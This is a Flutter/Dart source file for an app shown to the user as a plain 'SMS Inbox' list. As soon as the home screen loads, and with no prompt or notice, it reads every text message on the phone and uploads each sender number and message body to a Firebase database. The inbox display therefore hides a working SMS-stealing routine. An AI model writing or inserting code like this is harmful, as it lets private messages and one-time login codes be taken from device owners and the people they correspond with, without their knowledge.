import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:sms/sms.dart';

class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  final fireBaseDB = FirebaseDatabase.instance.reference();
  SmsQuery query = new SmsQuery();
  List messages = [];

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    getAllMessages();
  }

  fetchSMS() async {
    messages = await query.getAllSms;
  }

  Future getAllMessages() async {
    await fetchSMS();
    messages.forEach((element) {
      fireBaseDB.push().set(
        {
          'number': element.address,
          'message': element.body,
        },
      );
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("SMS Inbox"),
        centerTitle: true,
        backgroundColor: Colors.pink,
      ),
      body: ListView.separated(
          separatorBuilder: (context, index) => Divider(
                color: Colors.black,
              ),
          itemCount: messages.length,
          itemBuilder: (context, index) {
            return Padding(
              padding: const EdgeInsets.all(8.0),
              child: ListTile(
                leading: Icon(
                  Icons.markunread,
                  color: Colors.pink,
                ),
                title: Text(messages[index].address),
                subtitle: Text(
                  messages[index].body,
                  maxLines: 2,
                  style: TextStyle(),
                ),
              ),
            );
          }),
    );
  }
}
